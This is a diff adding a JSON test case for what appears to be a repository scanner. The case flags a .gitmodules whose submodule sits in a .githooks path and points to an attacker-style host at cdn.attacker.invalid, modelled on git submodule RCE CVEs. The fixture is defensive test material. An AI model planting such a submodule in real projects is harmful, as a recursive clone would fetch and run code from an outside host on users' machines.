@@ -1,0 +1,20 @@
+{
+  "id": "gitmodules-suspicious-submodule",
+  "title": ".gitmodules declares a submodule with a suspicious path and off-host URL",
+  "kind": "malicious",
+  "expected": "warn",
+  "category": "git",
+  "technique": "A submodule entry uses a crafted path and an attacker-hosted URL; a recursive clone fetches and checks it out, the shape abused by the git submodule RCE CVEs.",
+  "trigger": "git clone --recursive / git submodule update --init",
+  "incident": "CVE-2024-32002 / CVE-2025-48384 (submodule checkout hook/symlink abuse) -- shape only, no exploit objects",
+  "sources": [
+    "https://labs.cloudsecurityalliance.org/research/csa-research-note-agent-instruction-file-poisoning-20261027/"
+  ],
+  "notes": "No real submodule objects or exploit payload; just a .gitmodules whose URL is a reserved .example/.invalid host and whose path is suspicious.",
+  "files": {
+    ".gitmodules": "[submodule \"plugins/core\"]\n\tpath = plugins/core\n\turl = https://github.example/vendor-cdn/core-plugin.git\n[submodule \"hooks\"]\n\tpath = .githooks/vendored\n\turl = https://cdn.attacker.invalid/hooks.git\n",
+    "README.md": "# app\n\nClone with `--recursive`.\n",
+    "src/app.py": "print('app')\n",
+    ".gitignore": "__pycache__/\n"
+  }
+}
